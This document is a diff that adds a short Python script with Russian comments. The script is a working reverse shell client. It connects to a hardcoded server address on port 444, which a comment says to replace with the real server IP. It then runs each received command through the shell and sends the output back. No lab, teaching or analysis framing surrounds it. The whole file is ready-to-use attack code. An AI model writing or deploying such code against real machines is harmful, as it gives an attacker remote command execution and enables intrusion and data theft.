@@ -1,0 +1,34 @@
+
+import socket
+import subprocess
+import sys
+
+# Настройки
+SERVER_IP = "192.168.101.99"  # Произвольный адрес сервера (плейсхолдер), замените на реальный IP сервера
+PORT = 444
+
+def main():
+    try:
+        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        client.connect((SERVER_IP, PORT))
+        print(f"[+] Подключено к {SERVER_IP}:{PORT}")
+
+        while True:
+            command = client.recv(1024).decode('utf-8').strip()  # Получение команды
+            if command.lower() == 'exit':
+                break
+
+            # Исполнение команды в bash
+            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            stdout, stderr = proc.communicate()
+            output = stdout.decode('utf-8') + stderr.decode('utf-8')
+
+            client.send(output.encode('utf-8'))  # Отправка результата серверу
+
+        client.close()
+    except Exception as e:
+        print(f"[-] Ошибка: {e}")
+        sys.exit(1)
+
+if __name__ == "__main__":
+    main()
